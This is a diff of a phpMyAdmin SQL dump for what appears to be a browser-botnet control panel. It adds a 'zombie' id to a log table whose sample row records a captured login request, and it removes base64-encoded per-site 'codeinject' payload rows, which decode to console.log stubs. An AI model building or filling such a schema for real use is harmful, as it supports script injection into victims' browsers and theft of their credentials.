@@ -3,7 +3,7 @@
 -- http://www.phpmyadmin.net
 --
 -- Client :  localhost:8889
--- Généré le :  Jeu 14 Janvier 2016 à 11:43
+-- Généré le :  Lun 18 Janvier 2016 à 19:48
 -- Version du serveur :  5.5.38
 -- Version de PHP :  5.5.14
 
@@ -28,16 +28,18 @@ SET time_zone = "+00:00";
 
 CREATE TABLE `logs_checker` (
 `id` int(11) NOT NULL,
+  `id_zombie` int(11) NOT NULL,
   `url_site` text NOT NULL,
-  `logs_site` text NOT NULL
+  `logs_site` text NOT NULL,
+  `last` int(11) DEFAULT '0'
 ) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;
 
 --
 -- Contenu de la table `logs_checker`
 --
 
-INSERT INTO `logs_checker` (`id`, `url_site`, `logs_site`) VALUES
-(1, 'lol', 'effe');
+INSERT INTO `logs_checker` (`id`, `id_zombie`, `url_site`, `logs_site`, `last`) VALUES
+(1, 9, 'http://localhost:8888/login.php', 'username=ADMIN&password=PASSWORD', 1);
 
 -- --------------------------------------------------------
 
@@ -51,14 +53,6 @@ CREATE TABLE `payloads` (
   `urlverif` text NOT NULL,
   `codeinject` text NOT NULL
 ) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=5 ;
-
---
--- Contenu de la table `payloads`
---
-
-INSERT INTO `payloads` (`id`, `name`, `urlverif`, `codeinject`) VALUES
-(3, 'facebook', 'aWYodGFiVVJMLmluZGV4T2YoJ2ZhY2Vib29rJykgIT09IC0xICkgLy8gdXJsIGluICcnDQp7DQogICAgZmFjZWJvb2tfbG9hZCgpOw0KfQ==', 'ZnVuY3Rpb24gZmFjZWJvb2tfbG9hZCgpDQp7DQogICAgY29uc29sZS5sb2coJ2ZhY2Vib29rIGluanRlY3QnKQ0KfQ=='),
-(4, '7thspace', 'aWYodGFiVVJMLmluZGV4T2YoJzd0aHNwYWNlJykgIT09IC0xICkgLy8gdXJsIGluICcnDQp7DQogICAgdGVzdCgpOw0KfQ==', 'ZnVuY3Rpb24gdGVzdCgpDQp7DQogICAgY29uc29sZS5sb2coJ0luamVjdGVkIDd0aHNwYWNlJykNCn0=');
 
 -- --------------------------------------------------------
 
